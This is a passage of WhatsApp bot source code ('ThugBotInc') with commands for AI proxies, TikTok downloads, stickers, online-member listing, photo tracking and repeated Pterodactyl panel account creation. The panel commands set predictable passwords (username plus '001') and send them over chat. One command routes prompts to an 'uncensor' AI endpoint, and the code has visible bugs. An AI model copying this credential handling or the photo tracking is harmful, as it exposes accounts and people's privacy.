if (!text) return reply(`*Provide a query*\n*Example: ${prefix+command} baby*`)
 const rest = await (await fetch(`https://widipe.com/stablediffusion?text=${text}`))

ThugBotInc.sendMessage(m.chat,{image: rest, caption: `${text}`},{quoted:fsaluran})
break
case "gpt4": 
if (!text) return reply('*What do you want to ask, bro?*')
try {
let cct = await fetchJson(`https://widipe.com/gpt4?text=${text}`)
let resq = cct.result
reply(`${resq}`)
} catch (err) {
reply('*Website error*')
}
break
case 'flipcoin': case 'coin': {
        // Simulate flipping a coin (0 for heads, 1 for tails)
        const result = Math.random() < 0.5 ? 'Heads' : 'Tails';

        const flipCoinMessage = `*🪙 Coin Flip Result: ${result}*`;
        reply(flipCoinMessage);
      }
        break; 
        
case 'dice': case 'roll': {
        const result = Math.floor(Math.random() * 6) + 1; // Generate a random number between 1 and 6

        const diceMessage = `*🎲 Dice Roll Result: ${result}*`;

        reply(diceMessage);
      }
        break;   
        
case 'listonline': 
case 'listactive': 
case 'here': {
if (!m.isGroup) return reply(mess.group)
    try {
        let id = args && args[0] && /\d+\-\d+@g.us/.test(args[0]) ? args[0] : m.chat;
        let online = store.presences[id] ? [...Object.keys(store.presences[id]), botNumber] : [botNumber];

        if (online.length === 0) {
            return reply("No members are online right now.");
        }

        let liston = 1;
        let message = `╔═══════ ༻❁༺ ═══════╗\n` +
                      `   👑  *ONLINE MEMBERS* 👑\n` +
                      `╚═══════ ༻❁༺ ═══════╝\n\n` +
                      online.map(v => `${liston++}. @${v.replace(/@.+/, '')}`).join("\n");

        ThugBotInc.sendText(m.chat, message, m, { mentions: online });
    } catch (error) {
        console.error("Error in listonline command:", error.message);
        reply("*An error occurred while fetching online members.*");
    }
}
break;

case 'shutdown':
                if (!ThugTheCreator) return reply(mess.owner)
                reply(`*Restarting will be completed in seconds*`)
                await sleep(3000)
                process.exit()
            break
case 'track-photo': case 'photo-track': {
if (!/image/.test(mime)) return reply(`*Send/reply image/image you want to track*`)
reply('*Identifying image...*')
try {
let id = '13135550002@s.whatsapp.net'
const pht = await ThugBotInc.downloadAndSaveMediaMessage(quoted)
const tenka = await uptotelegra(pht)
let res = await fetchJson(`https://api.neoxr.eu/api/photo-tracker?image=${tenka}&apikey=APIKEYKAMU`)
ThugBotInc.sendMessage(m.chat, { text: `Cloud: @${id.split("@")[0]}\nRequest From: @${m.sender.split("@")[0]} \n\n${res.data}`, contextInfo:{
forwardingScore: 9999999, 
isForwarded: true,
mentionedJid:[id, m.sender]
}}, { quoted: m })
} catch (err) {
console.log(err)
reply('*Sorry the server has an error*')
}
}
break

case 'luna': {
  // Simulate a loading indicator (assuming loading() is defined elsewhere)
  await loading();

  // Array of dynamic greetings
  const greetings = [
    "*✨ Hey there! I'm Luna, your personal assistant! How can I make your day magical? 🧚🌙*",
    "*🌸 Hi! I'm Luna, your AI buddy. What’s on your mind today? 💡*",
    "*👋 Oh, hello! I was just waiting for someone interesting to talk to. How can I assist you? 😃*",
    "*🌟 Greetings, traveler! Seeking wisdom or just a good chat? Ask away! 🧠*",
    "*💫 Hello, friend! Need help, advice, or just a little fun? I’m here! 🎉*",
    "*🔮 Ah, finally! Someone who appreciates a good conversation. What’s up? 😏*",
    "*💜 Hey hey! It’s Luna in the house! What can I do for you today? 🎶*",
    "*⚡ Yo! Need answers, advice, or just some AI magic? You came to the right place! 🚀*",
    "*🦄 Surprise! It's Luna, the AI with a sprinkle of fun. What’s up?*",
    "*🌈 Hiya! Ready to add some color to your day? Ask me anything!*",
    "*🕶️ Sup? Luna here, bringing the cool factor. What’s the plan?*",
    "*🎭 Knock knock! (Who’s there?) It’s Luna! Ready for some fun?*",
    "*📡 Beep boop! AI connection secured. What’s the mission today?*",
    "*🧩 Puzzle time! What challenge can I help you solve today?*",
    "*🚀 Blast off! Luna here, ready to take your ideas to the stars!*",
    "*🎮 Game on! What are we tackling today?*",
    "*🎶 Do-re-mi... oh, hey! Need a melody or some wisdom?*",
    "*🌍 Big world, endless questions. What’s yours today?*",
    "*📖 Storytime! Want a fun fact or a little AI wisdom?*",
    "*🍿 Grab some popcorn—let’s chat! What’s up?*"
  ];

  // If no input text is provided, respond with a random greeting.
  if (!text) {
    return reply(greetings[Math.floor(Math.random() * greetings.length)]);
  }

  try {
    // Show a typing or thinking indicator before processing the API call.
    await reply("*🤔 Let me think... ⏳*");
    
    // Fetch the AI response
    let luna = await fetch(`https://apis.davidcyriltech.my.id/ai/uncensor?text=${encodeURIComponent(text)}`);
    
    if (!luna.ok) {
      throw new Error("Failed to fetch AI response");
    }

    const json = await luna.json();
    const { response } = json;

    // Send the response message
    await reply(`*🌼 𝙻𝚄𝙽𝙰 𝚁𝙴𝚂𝙿𝙾𝙽𝚂𝙴 🌼*\n\n📑 *${response}*`);
  } catch (err) {
    await reply("*Website error*");
  }

  break;
}


   

case 'sticker':
case 'stiker':
case 's':{
if (!quoted) return reply(`*Reply to a sticker*\n*Example ${prefix + command}*`)
if (/image/.test(mime)) {
let media = await quoted.download()
let encmedia = await ThugBotInc.sendImageAsSticker(m?.chat, media, m, {
packname: global.packname,
author: global.author
})
await fs.unlinkSync(encmedia)
} else if (/video/.test(mime)) {
if ((quoted.msg || quoted).seconds > 11) return reply('*Maximum 10 seconds!*')
let media = await quoted.download()
let encmedia = await ThugBotInc.sendVideoAsSticker(m?.chat, media, m, {
author: global.author
})
await fs.unlinkSync(encmedia)
} else {
return reply(`*Send Image/Video With Caption ${prefix + command}*\n*Video Duration 1-9 Seconds*`)
}
}
break
case 'tiktok2':
case 'tt2': {
    if (!text) return reply(`*Example: ${prefix + command} <TikTok URL>*`);

    try {
        await reply(`⏳ *Fetching your TikTok video... Please wait!*`);

        const isi = await axios.get(`https://apis.davidcyriltech.my.id/download/tiktok`, {
            params: { url: text }
        });

        const { success, data } = isi.data;

        if (success && data?.downloadLinks?.noWatermark) {
            const videoUrl = data.downloadLinks.noWatermark;
            const videoCaption = `
🎵 *TikTok Video Downloaded!*
✅ *No Watermark Version*

*© Powered By Thugnificent Tech™*
            `.trim();

            // Sending "Processing" reaction
            await ThugBotInc.sendMessage(m.chat, { react: { text: `📥`, key: m.key } });

            // Sending the video
            await ThugBotInc.sendMessage(m.chat, {
                video: { url: videoUrl },
                mimetype: 'video/mp4',
                caption: videoCaption
            }, { quoted: m });

            // Sending "Success" reaction
            await ThugBotInc.sendMessage(m.chat, { react: { text: `✅`, key: m.key } });
        } else {
            reply(`⚠️ *Failed to fetch the TikTok video.*\n\nPlease check the URL and try again.`);
        }
    } catch (error) {
        console.error("Error in TikTok Downloader:", error);
        reply(`*An error occurred while downloading the TikTok video.*\n\nPlease try again later.`);
    }
    break;
}
case '1gb': {
if (!isPremium) return replyprem(mess.premium)
if (!ThugTheCreator) return reply(mess.owner)
let t = text.split(','); 
if (t.length < 2) return reply(`*Incorrect format!*\n*Usage:*\n*${prefix + command} user,number*`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = global.eggsnya
let loc = global.plocation
let memo = "1024"
let cpu = "50"
let disk = "1024"
let email = username + "ThugBotInc.com"
akunlo = "https://i.imgur.com/xnru3dr.jpeg" 
if (!u) return
let d = (await ThugBotInc.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username+'001'
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
reply(`User ID: ${user.id}`)
let ctf = `Hi @${m.sender.split('@')[0]}
 Owner just gave you access to the following panel account⇩⇩

👤 Username: ${user.username}
🔐 Password: ${password}
🔗 Url: ${domain}`
ThugBotInc.sendMessage(u, { image: { url: 'https://i.imgur.com/xnru3dr.jpeg' }, caption: ctf }, { quoted: m })
let data2 = await f2.json()
let startup_cmd = data2.attributes.startup
let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name+' - 1gb',
"description": 'Create with '+namabot,
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return ThugBotInc(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await reply(`Successfully added User and Server


Type: user

Id: ${user.id}
Username: ${user.username}
Email: ${user.email}
Name: ${user.first_name} ${user.last_name}
Memory: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
Disk: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk + 'MB'}
Cpu: ${server.limits.cpu === 0 ? 'Unlimited' : server.limits.cpu + '%'}`)
}
break

case '2gb': {
if (!isPremium) return replyprem(mess.premium)
if (!ThugTheCreator) return reply(mess.owner)
let t = text.split(','); 
if (t.length < 2) return reply(`*Incorrect format!*\n*Usage:*\n*${prefix + command} user,number*`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = global.eggsnya
let loc = global.plocation
let memo = "2024"
let cpu = "70"
let disk = "2024"
let email = username + "ThugBotInc.com"
akunlo = "https://i.imgur.com/xnru3dr.jpeg" 
if (!u) return
let d = (await ThugBotInc.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username+'001'
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
reply(`User ID: ${user.id}`)
let ctf = `Hi @${m.sender.split('@')[0]}
 Owner just gave you access to the following panel account⇩⇩

👤 Username: ${user.username}
🔐 Password: ${password}
🔗 Url: ${domain}`
ThugBotInc.sendMessage(u, { image: { url: 'https://i.imgur.com/xnru3dr.jpeg' }, caption: ctf }, { quoted: m })
let data2 = await f2.json()
let startup_cmd = data2.attributes.startup
let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name+' - 1gb',
"description": 'Create with '+namabot,
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return ThugBotInc(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await reply(`Successfully added User to Server


Type: user

Id: ${user.id}
Username: ${user.username}
Email: ${user.email}
Name: ${user.first_name} ${user.last_name}
Memory: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
Disk: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk + 'MB'}
Cpu: ${server.limits.cpu === 0 ? 'Unlimited' : server.limits.cpu + '%'}`)
}
break

case '3gb': {
if (!isPremium) return replyprem(mess.premium)
if (!ThugTheCreator) return reply(mess.owner)
let t = text.split(','); 
if (t.length < 2) return reply(`Incorrect format!\nUsage\n${prefix + command} user,number`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = global.eggsnya
let loc = global.plocation
let memo = "3024"
let cpu = "80"
let disk = "3024"
let email = username + "ThugBotInc.com"
akunlo = "https://i.imgur.com/xnru3dr.jpeg" 
if (!u) return
let d = (await ThugBotInc.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username+'001'
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
reply(`User ID: ${user.id}`)
let ctf = `Hi @${m.sender.split('@')[0]}
 Owner just gave you access to the following panel account⇩⇩

👤 Username: ${user.username}
🔐 Password: ${password}
🔗 Url: ${domain}`
ThugBotInc.sendMessage(u, { image: { url: 'https://i.imgur.com/xnru3dr.jpeg' }, caption: ctf }, { quoted: m })
let data2 = await f2.json()
let startup_cmd = data2.attributes.startup
let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name+' - 1gb',
"description": 'Create with '+namabot,
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return ThugBotInc(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await reply(`Successfully added User and Server


Type: user

Id: ${user.id}
Username: ${user.username}
Email: ${user.email}
Name: ${user.first_name} ${user.last_name}
Memory: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
Disk: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk + 'MB'}
Cpu: ${server.limits.cpu === 0 ? 'Unlimited' : server.limits.cpu + '%'}`)
}
break

case '4gb': {
if (!isPremium) return replyprem(mess.premium)
if (!ThugTheCreator) return reply(mess.owner)
let t = text.split(','); 
if (t.length < 2) return reply(`*Incorrect format!*\n*Usage:*\n*${prefix + command} user,number*`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = global.eggsnya
let loc = global.plocation
let memo = "4024"
let cpu = "80"
let disk = "4024"
let email = username + "ThugBotInc.com"
akunlo = "https://i.imgur.com/xnru3dr.jpeg" 
if (!u) return
let d = (await ThugBotInc.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username+'001'
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
reply(`User ID: ${user.id}`)
let ctf = `Hi @${m.sender.split('@')[0]}
Owner Just Gave You Access To The Following Panel Account ⇩⇩

👤 Username: ${user.username}
🔐 Password: ${password}
🔗 Url: ${domain}`
ThugBotInc.sendMessage(u, { image: { url: 'https://i.imgur.com/xnru3dr.jpeg' }, caption: ctf }, { quoted: m })
let data2 = await f2.json()
let startup_cmd = data2.attributes.startup
let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name+' - 1gb',
"description": 'Create with '+namabot,
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return ThugBotInc(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await reply(`Successfully added User and Server

Type: user

Id: ${user.id}
Username: ${user.username}
Email: ${user.email}
Name: ${user.first_name} ${user.last_name}
Memory: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
Disk: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk + 'MB'}
Cpu: ${server.limits.cpu === 0 ? 'Unlimited' : server.limits.cpu + '%'}`)
}
break

case '5gb': {
if (!isPremium) return replyprem(mess.premium)
if (!ThugTheCreator) return reply(mess.owner)
let t = text.split(','); 
if (t.length < 2) return reply(`*Incorrect format!*\n*Usage:*\n*${prefix + command} user,number*`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = global.eggsnya
let loc = global.plocation
let memo = "5024"
let cpu = "100"
let disk = "5024"
let email = username + "ThugBotInc.com"
akunlo = "https://i.imgur.com/xnru3dr.jpeg" 
if (!u) return
let d = (await ThugBotInc.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username+'001'
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
reply(`User ID: ${user.id}`)
let ctf = `Hi @${m.sender.split('@')[0]}
 Owner just gave you access to the following panel account⇩⇩

👤 Username: ${user.username}
🔐 Password: ${password}
🔗 Url: ${domain}`
ThugBotInc.sendMessage(u, { image: { url: 'https://i.imgur.com/xnru3dr.jpeg' }, caption: ctf }, { quoted: m })
let data2 = await f2.json()
let startup_cmd = data2.attributes.startup
let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name+' - 1gb',
"description": 'Create with '+namabot,
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return ThugBotInc(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await reply(`Successfully added User and Server

Type: user

Id: ${user.id}
Username: ${user.username}
Email: ${user.email}
Name: ${user.first_name} ${user.last_name}
Memory: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
Disk: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk + 'MB'}
Cpu: ${server.limits.cpu === 0 ? 'Unlimited' : server.limits.cpu + '%'}`)
}
break

case '6gb': {
if (!isPremium) return replyprem(mess.premium)
if (!ThugTheCreator) return reply(mess.owner)
let t = text.split(','); 
if (t.length < 2) return reply(`*Incorrect format!*\n*Usage:*\n*${prefix + command} user,number*`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = global.eggsnya
let loc = global.plocation
let memo = "6024"
let cpu = "160"
let disk = "6024"
let email = username + "ThugBotInc.com"
akunlo = "https://i.imgur.com/xnru3dr.jpeg" 
if (!u) return
let d = (await ThugBotInc.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username+'001'
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
reply(`User ID: ${user.id}`)
let ctf = `Hi @${m.sender.split('@')[0]}
 Owner just gave you access to the following panel account ⇩⇩

👤 Username: ${user.username}
🔐 Password: ${password}
🔗 Url: ${domain}`
ThugBotInc.sendMessage(u, { image: { url: 'https://i.imgur.com/xnru3dr.jpeg' }, caption: ctf }, { quoted: m })
let data2 = await f2.json()
let startup_cmd = data2.attributes.startup
let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name+' - 1gb',
"description": 'Create with '+namabot,
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return ThugBotInc(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await reply(`Successfully added User and Server


Type: user

Id: ${user.id}
Username: ${user.username}
Email: ${user.email}
Name: ${user.first_name} ${user.last_name}
Memory: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
Disk: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk + 'MB'}
Cpu: ${server.limits.cpu === 0 ? 'Unlimited' : server.limits.cpu + '%'}`)
}
break

case '7gb': {
if (!isPremium) return replyprem(mess.premium)
if (!ThugTheCreator) return reply(mess.owner)
let t = text.split(','); 
if (t.length < 2) return reply(`*Incorrect format!*\n*Usage:*\n*${prefix + command} user,number*`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = global.eggsnya
let loc = global.plocation
let memo = "7024"
let cpu = "170"
let disk = "7024"
let email = username + "ThugBotInc.com"
akunlo = "https://i.imgur.com/xnru3dr.jpeg" 
if (!u) return
let d = (await ThugBotInc.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username+'001'
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
reply(`User ID: ${user.id}`)
let ctf = `Hi @${m.sender.split('@')[0]}
 Owner just gave you access to the following panel account ⇩⇩

👤 Username: ${user.username}
🔐 Password: ${password}
🔗 Url: ${domain}`
ThugBotInc.sendMessage(u, { image: { url: 'https://i.imgur.com/xnru3dr.jpeg' }, caption: ctf }, { quoted: m })
let data2 = await f2.json()
let startup_cmd = data2.attributes.startup
let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name+' - 1gb',
"description": 'Create with '+namabot,
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return ThugBotInc(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await reply(`Successfully added User and Server

Type: user

Id: ${user.id}
Username: ${user.username}
Email: ${user.email}
Name: ${user.first_name} ${user.last_name}
Memory: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
Disk: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk + 'MB'}
Cpu: ${server.limits.cpu === 0 ? 'Unlimited' : server.limits.cpu + '%'}`)
}
break

case '8gb': {
if (!isPremium) return replyprem(mess.premium)
if (!ThugTheCreator) return reply(mess.owner)
let t = text.split(','); 
if (t.length < 2) return reply(`*Incorrect format!*\n*Usage:*\n*${prefix + command} user,number*`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = global.eggsnya
let loc = global.plocation
let memo = "8024"
let cpu = "180"
let disk = "8024"
let email = username + "ThugBotInc.com"
akunlo = "https://i.imgur.com/xnru3dr.jpeg" 
if (!u) return
let d = (await ThugBotInc.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username+'001'
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
reply(`User ID: ${user.id}`)
let ctf = `Hai @${m.sender.split('@')[0]}
 Owner Baru Saja Memberikan Anda Akses Ke Akun Panel Berikut ⇩⇩

👤 Username: ${user.username}
🔐 Password: ${password}
🔗 Url: ${domain}`
ThugBotInc.sendMessage(u, { image: { url: 'https://i.imgur.com/xnru3dr.jpeg' }, caption: ctf }, { quoted: m })
let data2 = await f2.json()
let startup_cmd = data2.attributes.startup
let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name+' - 1gb',
"description": 'Create with '+namabot,
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return ThugBotInc(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await reply(`Successfully added User and Server

Type: user

Id: ${user.id}
Username: ${user.username}
Email: ${user.email}
Name: ${user.first_name} ${user.last_name}
Memory: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
Disk: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk + 'MB'}
